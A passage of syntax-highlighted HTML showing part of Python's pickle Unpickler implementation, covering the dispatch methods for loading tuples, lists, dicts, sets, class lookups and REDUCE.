class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BYTEARRAY8 exceeds system's maximum size "</span>                                  <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>        b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>readinto<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BYTEARRAY8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_bytearray8    <span class="token keyword">def</span> <span class="token function">load_next_buffer</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_buffers <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"pickle stream refers to out-of-band data "</span>                                  <span class="token string">"but no *buffers* argument was given"</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_buffers<span class="token punctuation">)</span>        <span class="token keyword">except</span> StopIteration<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"not enough out-of-band buffers"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NEXT_BUFFER<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_next_buffer    <span class="token keyword">def</span> <span class="token function">load_readonly_buffer</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        buf <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">with</span> <span class="token builtin">memoryview</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token keyword">as</span> m<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> m<span class="token punctuation">.</span>readonly<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">.</span>toreadonly<span class="token punctuation">(</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>READONLY_BUFFER<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_readonly_buffer    <span class="token keyword">def</span> <span class="token function">load_short_binstring</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_decode_string<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>SHORT_BINSTRING<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_short_binstring    <span class="token keyword">def</span> <span class="token function">load_short_binbytes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>SHORT_BINBYTES<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_short_binbytes    <span class="token keyword">def</span> <span class="token function">load_short_binunicode</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'surrogatepass'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>SHORT_BINUNICODE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_short_binunicode    <span class="token keyword">def</span> <span class="token function">load_tuple</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>TUPLE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple    <span class="token keyword">def</span> <span class="token function">load_empty_tuple</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EMPTY_TUPLE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_empty_tuple    <span class="token keyword">def</span> <span class="token function">load_tuple1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>TUPLE1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple1    <span class="token keyword">def</span> <span class="token function">load_tuple2</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>TUPLE2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple2    <span class="token keyword">def</span> <span class="token function">load_tuple3</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>TUPLE3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple3    <span class="token keyword">def</span> <span class="token function">load_empty_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EMPTY_LIST<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_empty_list    <span class="token keyword">def</span> <span class="token function">load_empty_dictionary</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EMPTY_DICT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_empty_dictionary    <span class="token keyword">def</span> <span class="token function">load_empty_set</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EMPTY_SET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_empty_set    <span class="token keyword">def</span> <span class="token function">load_frozenset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">frozenset</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>FROZENSET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_frozenset    <span class="token keyword">def</span> <span class="token function">load_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>items<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>LIST<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_list    <span class="token keyword">def</span> <span class="token function">load_dict</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token punctuation">&#123;</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> items<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>             <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>DICT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_dict    <span class="token comment"># INST and OBJ differ only in how they get a class object.  It's not</span>    <span class="token comment"># only sensible to do the rest in a common routine, the two routines</span>    <span class="token comment"># previously diverged and grew different bugs.</span>    <span class="token comment"># klass is the class to instantiate, and k points to the topmost mark</span>    <span class="token comment"># object, following which are the arguments for klass.__init__.</span>    <span class="token keyword">def</span> <span class="token function">_instantiate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> klass<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>args <span class="token keyword">or</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span> <span class="token keyword">or</span>            <span class="token builtin">hasattr</span><span class="token punctuation">(</span>klass<span class="token punctuation">,</span> <span class="token string">"__getinitargs__"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                value <span class="token operator">=</span> klass<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> TypeError <span class="token keyword">as</span> err<span class="token punctuation">:</span>                <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">"in constructor for %s: %s"</span> <span class="token operator">%</span>                                <span class="token punctuation">(</span>klass<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> klass<span class="token punctuation">.</span>__new__<span class="token punctuation">(</span>klass<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">load_inst</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        module <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>        klass <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_instantiate<span class="token punctuation">(</span>klass<span class="token punctuation">,</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>INST<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_inst    <span class="token keyword">def</span> <span class="token function">load_obj</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Stack is ... markobject classobject arg1 arg2 ...</span>        args <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        cls <span class="token operator">=</span> args<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_instantiate<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> args<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>OBJ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_obj    <span class="token keyword">def</span> <span class="token function">load_newobj</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        args <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        cls <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        obj <span class="token operator">=</span> cls<span class="token punctuation">.</span>__new__<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NEWOBJ<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_newobj    <span class="token keyword">def</span> <span class="token function">load_newobj_ex</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        kwargs <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        args <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        cls <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        obj <span class="token operator">=</span> cls<span class="token punctuation">.</span>__new__<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NEWOBJ_EX<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_newobj_ex    <span class="token keyword">def</span> <span class="token function">load_global</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        module <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        klass <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>klass<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>GLOBAL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_global    <span class="token keyword">def</span> <span class="token function">load_stack_global</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        module <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token builtin">str</span> <span class="token keyword">or</span> <span class="token builtin">type</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"STACK_GLOBAL requires str"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>STACK_GLOBAL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_stack_global    <span class="token keyword">def</span> <span class="token function">load_ext1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>get_extension<span class="token punctuation">(</span>code<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EXT1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_ext1    <span class="token keyword">def</span> <span class="token function">load_ext2</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_extension<span class="token punctuation">(</span>code<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EXT2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_ext2    <span class="token keyword">def</span> <span class="token function">load_ext4</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_extension<span class="token punctuation">(</span>code<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>EXT4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_ext4    <span class="token keyword">def</span> <span class="token function">get_extension</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>        nil <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        obj <span class="token operator">=</span> _extension_cache<span class="token punctuation">.</span>get<span class="token punctuation">(</span>code<span class="token punctuation">,</span> nil<span class="token punctuation">)</span>        <span class="token keyword">if</span> obj <span class="token keyword">is</span> <span class="token keyword">not</span> nil<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>            <span class="token keyword">return</span>        key <span class="token operator">=</span> _inverted_registry<span class="token punctuation">.</span>get<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> key<span class="token punctuation">:</span>            <span class="token keyword">if</span> code <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment"># note that 0 is forbidden</span>                <span class="token comment"># Corrupt or hostile pickle.</span>                <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"EXT specifies code &lt;= 0"</span><span class="token punctuation">)</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"unregistered extension code %d"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>        obj <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span><span class="token operator">*</span>key<span class="token punctuation">)</span>        _extension_cache<span class="token punctuation">[</span>code<span class="token punctuation">]</span> <span class="token operator">=</span> obj        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Subclasses may override this.</span>        sys<span class="token punctuation">.</span>audit<span class="token punctuation">(</span><span class="token string">'pickle.find_class'</span><span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>fix_imports<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">:</span>                module<span class="token punctuation">,</span> name <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">[</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token keyword">elif</span> module <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">:</span>                module <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">[</span>module<span class="token punctuation">]</span>        <span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> level<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> _getattribute<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">load_reduce</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        args <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        func <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>REDUCE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_reduce    <span class="token keyword">def</span> <span class="token function">load_pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">:</span>            <span class="token keyword">del</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>POP<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_pop    <span class="token keyword">def</span> <span class="token function">load_pop_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>POP_MARK<span class="token punctuation">[</span><span class="token 